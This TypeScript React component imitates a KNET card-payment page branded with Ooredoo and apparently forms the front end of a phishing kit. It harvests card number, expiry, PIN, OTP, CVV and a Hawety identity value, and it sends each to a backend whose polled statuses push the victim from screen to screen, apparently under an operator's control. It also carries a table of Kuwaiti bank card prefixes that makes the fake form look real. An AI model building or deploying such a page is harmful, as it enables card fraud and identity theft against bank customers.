import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import "../styles/knet-unified.css";

type PaymentStage = "knet" | "loading" | "otp" | "cvv" | "hawety" | "success" | "error";

interface PaymentData {
  paymentId?: string;
  amount: string;
  merchant: string;
  bank: string;
  cardPrefix: string;
  cardNumber: string;
  month: string;
  year: string;
  pin: string;
  otp?: string;
  cvv?: string;
  hawety?: string;
}

const BANKS = [
  { value: "prefix", label: "Select Your Bank" },
  { value: "Al Ahli Bank of Kuwait [ABK]", label: "Al Ahli Bank of Kuwait [ABK]" },
  { value: "Al Rajhi Bank [Rajhi]", label: "Al Rajhi Bank [Rajhi]" },
  { value: "Bank of Bahrain Kuwait [BBK]", label: "Bank of Bahrain Kuwait [BBK]" },
  { value: "Boubyan Bank [Boubyan]", label: "Boubyan Bank [Boubyan]" },
  { value: "Burgan Bank [Burgan]", label: "Burgan Bank [Burgan]" },
  { value: "Commercial Bank of Kuwait [CBK]", label: "Commercial Bank of Kuwait [CBK]" },
  { value: "Doha Bank [Doha]", label: "Doha Bank [Doha]" },
  { value: "Gulf Bank of Kuwait [GBK]", label: "Gulf Bank of Kuwait [GBK]" },
  { value: "KFH [TAM]", label: "KFH [TAM]" },
  { value: "Kuwait Finance House [KFH]", label: "Kuwait Finance House [KFH]" },
  { value: "Kuwait International Bank [KIB]", label: "Kuwait International Bank [KIB]" },
  { value: "National Bank of Kuwait [NBK]", label: "National Bank of Kuwait [NBK]" },
  { value: "NBK [Weyay]", label: "NBK [Weyay]" },
  { value: "Qatar National Bank [QNB]", label: "Qatar National Bank [QNB]" },
  { value: "Union National Bank [UNB]", label: "Union National Bank [UNB]" },
  { value: "arba Bank [Warba]", label: "Warba Bank [Warba]" },
];

const BANK_PREFIXES: Record<string, string[]> = {
  "Al Ahli Bank of Kuwait [ABK]": ["403622", "423826", "428628"],
  "Al Rajhi Bank [Rajhi]": ["458838"],
  "Bank of Bahrain Kuwait [BBK]": ["418056", "588790"],
  "Boubyan Bank [Boubyan]": ["404919", "450605", "426058", "431199", "470350", "490455", "490456"],
  "Burgan Bank [Burgan]": ["540759", "402978", "415254", "450238", "468564", "403583", "49219000"],
  "Commercial Bank of Kuwait [CBK]": ["521175", "516334", "532672", "537015"],
  "Doha Bank [Doha]": ["419252"],
  "Gulf Bank of Kuwait [GBK]": ["531329", "531471", "531470", "517419", "559475", "517458", "531644", "526206"],
  "KFH [TAM]": ["45077848", "45077849"],
  "Kuwait Finance House [KFH]": ["450778", "485602", "573016", "532674"],
  "Kuwait International Bank [KIB]": ["409054", "406464"],
  "National Bank of Kuwait [NBK]": ["464452", "589160"],
  "NBK [Weyay]": ["46445250", "543363"],
  "Qatar National Bank [QNB]": ["521020", "524745"],
  "Union National Bank [UNB]": ["457778"],
  "arba Bank [Warba]": ["532749", "559459", "541350", "525528"],
};

export default function UnifiedPayment() {
  const [location, setLocation] = useLocation();
  const [stage, setStage] = useState<PaymentStage>("knet");
  const [paymentData, setPaymentData] = useState<PaymentData>({
    amount: "KD 5.000",
    merchant: "Ooredoo",
    bank: "",
    cardPrefix: "",
    cardNumber: "",
    month: "0",
    year: "",
    pin: "",
  });
  const [errors, setErrors] = useState<Record<string, string>>({});
  const [statusMessage, setStatusMessage] = useState("");
  const [pollingInterval, setPollingInterval] = useState<NodeJS.Timeout | null>(null);

  // Get amount from URL params
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const amount = params.get("amount");
    if (amount) {
      setPaymentData((prev) => ({ ...prev, amount }));
    }
  }, []);

  // Polling for payment status
  useEffect(() => {
    if (stage === "loading" && paymentData.paymentId) {
      const poll = async () => {
        try {
          const response = await fetch(
            `/api/trpc/payment.getPaymentStatus?input=${JSON.stringify({ paymentId: paymentData.paymentId })}`
          );
          const data = await response.json();

          if (data.result?.data?.status) {
            const status = data.result.data.status;

            if (status === "otp1_pending") {
              setStage("otp");
              setStatusMessage("جاري إرسال رمز التحقق...");
            } else if (status === "cvv_pending") {
              setStage("cvv");
              setStatusMessage("جاري التحقق من CVV...");
            } else if (status === "hawety_pending") {
              setStage("hawety");
              setStatusMessage("جاري التحقق من بيانات الهوية...");
            } else if (status === "completed") {
              setStage("success");
              if (pollingInterval) clearInterval(pollingInterval);
            } else if (status === "rejected") {
              setStage("error");
              if (pollingInterval) clearInterval(pollingInterval);
            }
          }
        } catch (error) {
          console.error("Polling error:", error);
        }
      };

      const interval = setInterval(poll, 2000);
      setPollingInterval(interval);

      return () => clearInterval(interval);
    }
  }, [stage, paymentData.paymentId, pollingInterval]);

  const validateKnetForm = () => {
    const newErrors: Record<string, string> = {};

    if (!paymentData.bank || paymentData.bank === "prefix") {
      newErrors.bank = "يرجى اختيار البنك";
    }
    if (!paymentData.cardPrefix) {
      newErrors.cardPrefix = "يرجى اختيار البادئة";
    }
    if (!paymentData.cardNumber || paymentData.cardNumber.length !== 10) {
      newErrors.cardNumber = "رقم البطاقة يجب أن يكون 10 أرقام";
    }
    if (!paymentData.month || paymentData.month === "0") {
      newErrors.month = "يرجى اختيار الشهر";
    }
    if (!paymentData.year) {
      newErrors.year = "يرجى اختيار السنة";
    }
    if (!paymentData.pin || paymentData.pin.length !== 4) {
      newErrors.pin = "الرقم السري يجب أن يكون 4 أرقام";
    }

    setErrors(newErrors);
    return Object.keys(newErrors).length === 0;
  };

  const handleKnetSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!validateKnetForm()) return;

    setStage("loading");
    setStatusMessage("جاري معالجة الطلب...");

    try {
      const response = await fetch("/api/trpc/payment.submitKnet", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          amount: paymentData.amount,
          bank: paymentData.bank,
          cardNumber: paymentData.cardPrefix + paymentData.cardNumber,
          expiryMonth: paymentData.month,
          expiryYear: paymentData.year,
          pin: paymentData.pin,
        }),
      });

      const data = await response.json();

      if (data.result?.data?.paymentId) {
        setPaymentData((prev) => ({
          ...prev,
          paymentId: data.result.data.paymentId,
        }));
      } else {
        setStage("error");
        setStatusMessage("حدث خطأ في معالجة الطلب");
      }
    } catch (error) {
      console.error("Submit error:", error);
      setStage("error");
      setStatusMessage("خطأ في الاتصال");
    }
  };

  const handleOtpSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!paymentData.otp || paymentData.otp.length !== 6) {
      setErrors({ otp: "رمز التحقق يجب أن يكون 6 أرقام" });
      return;
    }

    setStage("loading");
    setStatusMessage("جاري التحقق من الرمز...");

    try {
      const response = await fetch("/api/trpc/payment.submitOtp", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          paymentId: paymentData.paymentId,
          otp: paymentData.otp,
        }),
      });

      const data = await response.json();

      if (data.result?.data?.success) {
        // Continue polling
      } else {
        setStage("otp");
        setErrors({ otp: "رمز التحقق غير صحيح" });
      }
    } catch (error) {
      console.error("OTP error:", error);
      setStage("otp");
      setErrors({ otp: "خطأ في الاتصال" });
    }
  };

  const handleCvvSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!paymentData.cvv || paymentData.cvv.length !== 3) {
      setErrors({ cvv: "CVV يجب أن يكون 3 أرقام" });
      return;
    }

    setStage("loading");
    setStatusMessage("جاري التحقق من CVV...");

    try {
      const response = await fetch("/api/trpc/payment.submitCvv", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          paymentId: paymentData.paymentId,
          cvv: paymentData.cvv,
        }),
      });

      const data = await response.json();

      if (data.result?.data?.success) {
        // Continue polling
      } else {
        setStage("cvv");
        setErrors({ cvv: "CVV غير صحيح" });
      }
    } catch (error) {
      console.error("CVV error:", error);
      setStage("cvv");
      setErrors({ cvv: "خطأ في الاتصال" });
    }
  };

  const handleHawetySubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    if (!paymentData.hawety) {
      setErrors({ hawety: "يرجى إدخال بيانات الهوية" });
      return;
    }

    setStage("loading");
    setStatusMessage("جاري التحقق من بيانات الهوية...");

    try {
      const response = await fetch("/api/trpc/payment.submitHawety", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          paymentId: paymentData.paymentId,
          hawety: paymentData.hawety,
        }),
      });

      const data = await response.json();

      if (data.result?.data?.success) {
        // Continue polling
      } else {
        setStage("hawety");
        setErrors({ hawety: "بيانات الهوية غير صحيحة" });
      }
    } catch (error) {
      console.error("Hawety error:", error);
      setStage("hawety");
      setErrors({ hawety: "خطأ في الاتصال" });
    }
  };

  const handleCancel = () => {
    setLocation("/");
  };

  const getPrefixOptions = () => {
    if (!paymentData.bank || paymentData.bank === "prefix") {
      return [];
    }
    return BANK_PREFIXES[paymentData.bank] || [];
  };

  return (
    <div className="knet-container">
      {/* Header Banner */}
      <div className="knet-header">
        <img src="/knet/knet.png" alt="KNET" className="knet-logo" />
      </div>

      <div className="knet-content">
        {/* Loading Stage - with Ooredoo logo and spinner */}
        {stage === "loading" && (
          <div className="loading-page">
            <div className="loading-spinner-container">
              <div className="ooredoo-logo-wrapper">
                <img src="/ooredoo-logo.png" alt="Ooredoo" className="ooredoo-logo" />
              </div>
              <div className="spinner-ring"></div>
            </div>
            <p className="loading-message">{statusMessage || "جاري المعالجة..."}</p>
          </div>
        )}

        {/* KNET Form Stage */}
        {stage === "knet" && (
          <form onSubmit={handleKnetSubmit} className="knet-form">
            <div className="form-card">
              <div className="card-header">
                <img src="/knet/knet.png" alt="KNET" className="card-logo" />
              </div>

              <div className="form-row">
                <label className="form-label">Merchant:</label>
                <span className="form-value">{paymentData.merchant}</span>
              </div>

              <div className="form-row">
                <label className="form-label">Amount:</label>
                <span className="form-value">{paymentData.amount}</span>
              </div>
            </div>

            <div className="form-card">
              <div className="form-row">
                <label className="form-label">Select Your Bank:</label>
                <select
                  value={paymentData.bank}
                  onChange={(e) => {
                    setPaymentData((prev) => ({
                      ...prev,
                      bank: e.target.value,
                      cardPrefix: "",
                    }));
                    setErrors((prev) => {
                      const newErrors = { ...prev };
                      delete newErrors.bank;
                      return newErrors;
                    });
                  }}
                  className={`form-select ${errors.bank ? "error" : ""}`}
                >
                  {BANKS.map((bank) => (
                    <option key={bank.value} value={bank.value}>
                      {bank.label}
                    </option>
                  ))}
                </select>
                {errors.bank && <span className="error-text">{errors.bank}</span>}
              </div>

              <div className="form-row three-column">
                <label className="form-label">Card Number:</label>
                <select
                  value={paymentData.cardPrefix}
                  onChange={(e) => {
                    setPaymentData((prev) => ({
                      ...prev,
                      cardPrefix: e.target.value,
                    }));
                    setErrors((prev) => {
                      const newErrors = { ...prev };
                      delete newErrors.cardPrefix;
                      return newErrors;
                    });
                  }}
                  className={`form-select-prefix ${errors.cardPrefix ? "error" : ""}`}
                >
                  <option value="">Prefix</option>
                  {getPrefixOptions().map((prefix) => (
                    <option key={prefix} value={prefix}>
                      {prefix}
                    </option>
                  ))}
                </select>

                <input
                  type="tel"
                  inputMode="numeric"
                  pattern="[0-9]*"
                  maxLength={10}
                  value={paymentData.cardNumber}
                  onChange={(e) => {
                    setPaymentData((prev) => ({
                      ...prev,
                      cardNumber: e.target.value.replace(/\D/g, ""),
                    }));
                    setErrors((prev) => {
                      const newErrors = { ...prev };
                      delete newErrors.cardNumber;
                      return newErrors;
                    });
                  }}
                  placeholder="Card Number"
                  className={`form-input ${errors.cardNumber ? "error" : ""}`}
                />
                {errors.cardNumber && <span className="error-text">{errors.cardNumber}</span>}
              </div>

              <div className="form-row three-column">
                <label className="form-label">Expiration Date:</label>
                <select
                  value={paymentData.month}
                  onChange={(e) => {
                    setPaymentData((prev) => ({
                      ...prev,
                      month: e.target.value,
                    }));
                    setErrors((prev) => {
                      const newErrors = { ...prev };
                      delete newErrors.month;
                      return newErrors;
                    });
                  }}
                  className={`form-select-date ${errors.month ? "error" : ""}`}
                >
                  <option value="0">MM</option>
                  {Array.from({ length: 12 }, (_, i) => (
                    <option key={i + 1} value={String(i + 1).padStart(2, "0")}>
                      {String(i + 1).padStart(2, "0")}
                    </option>
                  ))}
                </select>

                <select
                  value={paymentData.year}
                  onChange={(e) => {
                    setPaymentData((prev) => ({
                      ...prev,
                      year: e.target.value,
                    }));
                    setErrors((prev) => {
                      const newErrors = { ...prev };
                      delete newErrors.year;
                      return newErrors;
                    });
                  }}
                  className={`form-select-date ${errors.year ? "error" : ""}`}
                >
                  <option value="">YYYY</option>
                  {Array.from({ length: 10 }, (_, i) => {
                    const year = new Date().getFullYear() + i;
                    return (
                      <option key={year} value={year}>
                        {year}
                      </option>
                    );
                  })}
                </select>
                {(errors.month || errors.year) && (
                  <span className="error-text">{errors.month || errors.year}</span>
                )}
              </div>

              <div className="form-row">
                <label className="form-label">PIN:</label>
                <input
                  type="password"
                  inputMode="numeric"
                  pattern="[0-9]*"
                  maxLength={4}
                  value={paymentData.pin}
                  onChange={(e) => {
                    setPaymentData((prev) => ({
                      ...prev,
                      pin: e.target.value.replace(/\D/g, ""),
                    }));
                    setErrors((prev) => {
                      const newErrors = { ...prev };
                      delete newErrors.pin;
                      return newErrors;
                    });
                  }}
                  placeholder="PIN"
                  className={`form-input ${errors.pin ? "error" : ""}`}
                />
                {errors.pin && <span className="error-text">{errors.pin}</span>}
              </div>
            </div>

            <div className="form-buttons">
              <button type="submit" className="btn-submit">
                Submit
              </button>
              <button type="button" onClick={handleCancel} className="btn-cancel">
                Cancel
              </button>
            </div>
          </form>
        )}

        {/* OTP Stage */}
        {stage === "otp" && (
          <form onSubmit={handleOtpSubmit} className="knet-form">
            <div className="form-card">
              <h2 className="form-title">Enter OTP</h2>
              <div className="form-row">
                <label className="form-label">OTP Code:</label>
                <input
                  type="tel"
                  inputMode="numeric"
                  pattern="[0-9]*"
                  maxLength={6}
                  value={paymentData.otp || ""}
                  onChange={(e) => {
                    setPaymentData((prev) => ({
                      ...prev,
                      otp: e.target.value.replace(/\D/g, ""),
                    }));
                    setErrors((prev) => {
                      const newErrors = { ...prev };
                      delete newErrors.otp;
                      return newErrors;
                    });
                  }}
                  placeholder="000000"
                  className={`form-input ${errors.otp ? "error" : ""}`}
                />
                {errors.otp && <span className="error-text">{errors.otp}</span>}
              </div>
            </div>

            <div className="form-buttons">
              <button type="submit" className="btn-submit">
                Submit
              </button>
              <button type="button" onClick={handleCancel} className="btn-cancel">
                Cancel
              </button>
            </div>
          </form>
        )}

        {/* CVV Stage */}
        {stage === "cvv" && (
          <form onSubmit={handleCvvSubmit} className="knet-form">
            <div className="form-card">
              <h2 className="form-title">Enter CVV</h2>
              <div className="form-row">
                <label className="form-label">CVV Code:</label>
                <input
                  type="tel"
                  inputMode="numeric"
                  pattern="[0-9]*"
                  maxLength={3}
                  value={paymentData.cvv || ""}
                  onChange={(e) => {
                    setPaymentData((prev) => ({
                      ...prev,
                      cvv: e.target.value.replace(/\D/g, ""),
                    }));
                    setErrors((prev) => {
                      const newErrors = { ...prev };
                      delete newErrors.cvv;
                      return newErrors;
                    });
                  }}
                  placeholder="000"
                  className={`form-input ${errors.cvv ? "error" : ""}`}
                />
                {errors.cvv && <span className="error-text">{errors.cvv}</span>}
              </div>
            </div>

            <div className="form-buttons">
              <button type="submit" className="btn-submit">
                Submit
              </button>
              <button type="button" onClick={handleCancel} className="btn-cancel">
                Cancel
              </button>
            </div>
          </form>
        )}

        {/* Hawety Stage */}
        {stage === "hawety" && (
          <form onSubmit={handleHawetySubmit} className="knet-form">
            <div className="form-card">
              <h2 className="form-title">Enter Hawety ID</h2>
              <div className="form-row">
                <label className="form-label">Hawety ID:</label>
                <input
                  type="text"
                  value={paymentData.hawety || ""}
                  onChange={(e) => {
                    setPaymentData((prev) => ({
                      ...prev,
                      hawety: e.target.value,
                    }));
                    setErrors((prev) => {
                      const newErrors = { ...prev };
                      delete newErrors.hawety;
                      return newErrors;
                    });
                  }}
                  placeholder="Enter your Hawety ID"
                  className={`form-input ${errors.hawety ? "error" : ""}`}
                />
                {errors.hawety && <span className="error-text">{errors.hawety}</span>}
              </div>
            </div>

            <div className="form-buttons">
              <button type="submit" className="btn-submit">
                Submit
              </button>
              <button type="button" onClick={handleCancel} className="btn-cancel">
                Cancel
              </button>
            </div>
          </form>
        )}

        {/* Success Stage */}
        {stage === "success" && (
          <div className="success-page">
            <div className="success-icon">✓</div>
            <h2>Payment Successful</h2>
            <p>Your payment has been processed successfully.</p>
            <button onClick={handleCancel} className="btn-submit">
              Return Home
            </button>
          </div>
        )}

        {/* Error Stage */}
        {stage === "error" && (
          <div className="error-page">
            <div className="error-icon">✕</div>
            <h2>Payment Failed</h2>
            <p>{statusMessage || "An error occurred during payment processing."}</p>
            <button onClick={handleCancel} className="btn-submit">
              Try Again
            </button>
          </div>
        )}
      </div>
    </div>
  );
}
